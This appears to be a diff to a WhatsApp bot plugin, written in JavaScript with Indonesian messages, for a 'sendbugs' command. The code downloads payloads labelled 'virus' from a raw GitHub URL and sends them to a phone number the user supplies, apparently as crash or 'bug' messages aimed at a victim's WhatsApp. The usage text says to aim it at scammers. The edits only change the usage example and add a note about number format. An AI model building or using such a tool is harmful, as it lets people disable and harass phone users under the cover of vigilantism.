@@ -6,7 +6,7 @@ import { sticker } from '../lib/sticker.js'
 const { generateWAMessageFromContent, prepareWAMessageMedia, proto } = pkg
 
 let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participants }) => {
-	if (!text)return m.reply(`Contoh Penggunaan : *${_p + command}* <nomor>\n\n*Note :*\nGunakan Fitur Hanya Untuk Ripper Atau Scamer jangan pulak owner gw @${nomorown.split`@`[0]}`)
+	if (!text)return m.reply(`Contoh Penggunaan : *${_p + command}* <62XXXXXXXXXX>\n\n*Note :*\nGunakan Fitur Hanya Untuk Ripper Atau Scamer jangan pulak owner gw @${nomorown.split`@`[0]}`)
 	let thumb = fs.readFileSync('./thumbnail.jpg')
 	let virus = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")).text()
 	let virus2 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v26.txt")).text()
@@ -245,7 +245,8 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 			if (!/[01]/.test(command)) return conn.sendMessage(m.chat, listMessage, m)
 			throw false
 	}
-	m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
+	m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net
+NOTE ⚠️ > INGAT GUNAKAN +62 DAN ISIKAN NOMORNYA DENGAN BENAR JIKA ASAL ASALAN BOT TIDAK AKAN BERJALAN`)
 }
 
 handler.help = ['sendbugs <nomer>']
